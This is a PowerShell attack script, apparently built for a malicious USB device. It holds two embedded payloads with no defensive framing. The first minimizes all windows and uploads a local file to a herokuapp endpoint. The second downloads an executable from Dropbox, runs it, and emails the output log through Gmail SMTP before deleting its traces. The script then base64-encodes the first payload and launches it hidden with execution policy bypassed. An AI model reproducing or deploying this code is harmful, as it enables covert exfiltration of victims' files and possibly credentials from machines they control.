$Myscript = @'
	@echo off
	$shell = New-Object -ComObject "Shell.Application";
	$shell.minimizeall();
	$FilePath = 'C:\Users\huy\AppData\Local\Temp\a.txt';
	$URL = 'https://ttss2.herokuapp.com/torrent';

	$fileBytes = [System.IO.File]::ReadAllBytes($FilePath);
	$fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
	$boundary = [System.Guid]::NewGuid().ToString(); 
	$LF = "`r`n";

	$bodyLines = ( 
	    "--$boundary",
	    "Content-Disposition: form-data; name=`"file`"; filename=`"a.txt`"",
	    "Content-Type: application/octet-stream$LF",
	    $fileEnc,
	    "--$boundary--$LF" 
	) -join $LF

	Invoke-RestMethod -Uri $URL -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
	Exit
'@
#########################################################################


$MyScript2 = @'
	@echo off

	$downloadURL='https://www.dropbox.com/s/c0xqzds296jlal3/1.exe?dl=1'
	$email='email@gmail.com'
	$password='PASSWORD'

	$exeFile=$env:temp+'\a.txt'
	$logFile=$env:temp+'\a.txt'
	$arguments='all'
	$subject='huy'
	$body='dnn'


	(new-object System.Net.WebClient).DownloadFile($downloadURL, $exeFile);
	$exeFile $arguments > $logFile

	del $exeFile

	$SMTPServer = 'smtp.gmail.com';
	$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);
	$SMTPInfo.EnableSsl = $true;
	$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($email, $password);
	$ReportEmail = New-Object System.Net.Mail.MailMessage;
	$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');
	$ReportEmail.Subject = $subject;
	$ReportEmail.Body = $body;
	$ReportEmail.Attachments.Add($logFile);
	$SMTPInfo.Send($ReportEmail);

	del $logFile
'@



$MyEncodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyScript))
write-output $MyEncodedScript 


powershell -NoP -W Minimized -windowstyle hidden -ExecutionPolicy Bypass -E $MyEncodedScript 


Exit


